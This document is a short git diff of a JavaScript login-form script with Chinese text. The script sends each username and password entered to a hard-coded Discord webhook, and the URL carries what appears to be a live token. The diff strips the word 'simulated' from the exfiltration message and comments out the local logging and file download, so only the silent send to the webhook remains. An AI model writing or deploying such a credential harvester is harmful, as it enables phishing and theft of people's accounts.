@@ -9,7 +9,7 @@ document.addEventListener("DOMContentLoaded", () => {
             alert("請輸入帳號與密碼！");
             return;
         }
-
+        /*
         console.log("輸入的帳號:", username);
         console.log("輸入的密碼:", password);
 
@@ -21,7 +21,7 @@ document.addEventListener("DOMContentLoaded", () => {
         const link = document.createElement('a');
         link.href = URL.createObjectURL(blob);
         link.download = 'account.txt';
-        link.click();
+        link.click();*/
 
         // 傳送到 Discord Webhook
         const webhookURL = "https://discord.com/api/webhooks/1380062024582692935/3_1l1EnLTwsSR1uH15wUhb1jdg-5DE4IZ-OLNbYcrRh9KWlE65RM9KZfIaVwPoW1xLQj";
@@ -32,7 +32,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                content: `📥 模擬帳密收集\n👤 帳號：${username}\n🔐 密碼：${password}`
+                content: `帳密收集\n帳號：${username}\n密碼：${password}`
             }),
         }).then(() => {
             console.log("已送出至 Discord Webhook");
